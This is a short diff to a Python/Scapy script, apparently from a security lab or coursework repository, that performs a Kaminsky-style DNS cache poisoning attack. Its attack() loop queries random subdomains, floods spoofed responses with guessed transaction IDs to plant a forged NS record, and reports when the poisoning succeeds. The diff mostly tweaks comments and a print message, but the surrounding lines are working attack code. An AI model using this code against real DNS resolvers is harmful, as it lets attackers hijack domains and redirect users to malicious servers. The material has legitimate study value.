@@ -72,10 +72,9 @@ def attack():
 		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
         ar=None
 	)
-    # qdcount=1, ancount=1, nscount=1, arcount=0
 
     while (1):
-        # per new url:
+        # per new url
         url = getRandomSubDomain() + '.' + base_domain
         dns_request[DNS].qd.qname = url
         fake_response[DNS].qd.qname = url
@@ -84,6 +83,8 @@ def attack():
 
         # send dns query
         sendPacket(sock, dns_request, my_ip, dns_port)
+
+        # any higher than 30 is a waste of time
         for i in range(30):
             fake_response[DNS].id = getRandomTXID()
             sendPacket(sock, fake_response, my_ip, query_port)
@@ -95,7 +96,7 @@ def attack():
         response = DNS(response)
         try:
             if response[DNS].ns[0].rdata == spoof:
-                print "Successfully poisonned %s NS with a dummy record!" % url
+                print "Successfully poisonned %s NS with a dummy record!" % base_domain[:-1]
                 break
             else:
                 print "Poisonning on %s failed" % url
